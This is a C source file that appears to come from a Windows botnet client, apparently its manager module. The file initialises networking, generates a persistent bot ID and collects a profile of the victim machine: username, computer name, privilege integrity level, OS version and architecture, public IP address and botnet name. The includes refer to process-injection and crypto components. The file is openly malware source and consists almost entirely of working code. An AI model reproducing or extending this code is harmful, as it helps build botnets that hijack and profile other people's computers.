#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#include <versionhelpers.h>

#include "bot.h"
#include "connection.h"

#include "functions_table.h"

#include "process_injections.h"

#include "global_config.h"
#include "debug.h"

#include "crypto.h"

#include "common_utils.h"

#include <stdlib.h>

// Global vars
BOT_INFORMATION MANAGER_BOT_INFO;

//
bool manager_init_winsock_application()
{
	// Initialize Winsock
	WSADATA wsaData;

	int iResult = l_WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (iResult != 0) {
		DBG_MSG("manager_init_winsock_application() - l_WSAStartup failed with error: %d\n", iResult);
		return false;
	}

	return true;
}

bool manager_init_bot_id()
{
	if (is_bot_id_existed()) return true;

	char* bot_id = generate_alpha_numeric_string(31);

	bool ret = set_bot_id(bot_id);

	free(bot_id);

	if (!ret) return false;

	return true;
}

bool manager_init_bot_info()
{
	ZeroMemory((PVOID)&MANAGER_BOT_INFO, sizeof MANAGER_BOT_INFO);


	bool ret = false;

	//
	ret = bot_get_bot_id(MANAGER_BOT_INFO.BOT_ID);
	if (!ret) return false;

	//
	ret = bot_get_current_username(MANAGER_BOT_INFO.BOT_USERNAME);
	if (!ret) return false;


	//
	ret = bot_get_pcname(MANAGER_BOT_INFO.BOT_PCNAME);
	if (!ret) return false;

	//
	ret = bot_get_integrity_level(&(MANAGER_BOT_INFO.BOT_INTEGRITY_LEVEL));
	if (!ret) return false;

	//
	bot_get_bot_version(&(MANAGER_BOT_INFO.BOT_VERSION));

	//
	ret = bot_get_bot_os_version_info(&(MANAGER_BOT_INFO.BOT_OSVERSION_MAJOR), &(MANAGER_BOT_INFO.BOT_OSVERSION_MINOR), &(MANAGER_BOT_INFO.BOT_OSVERSION_BUILD_NUMBER), MANAGER_BOT_INFO.BOT_SERVICE_PACK_STRING);
	if (!ret) return false;

	//
	bot_get_bot_os_arch(&(MANAGER_BOT_INFO.BOT_OSVERSION_IS_X64));

	//
	ret = bot_get_bot_public_ip_address(MANAGER_BOT_INFO.BOT_IP_ADDRESS);

	// for failsafe, we do not check this. If the function failed, the ip is: 0.0.0.0
	//if (!ret) return false;


	//
	bot_get_botnet_name(MANAGER_BOT_INFO.BOT_BOTNET_NAME);

	//
	MANAGER_BOT_INFO.BOT_IS_WINDOWS_SERVER = (int)IsWindowsServer();

	// happy end.

	return true;
}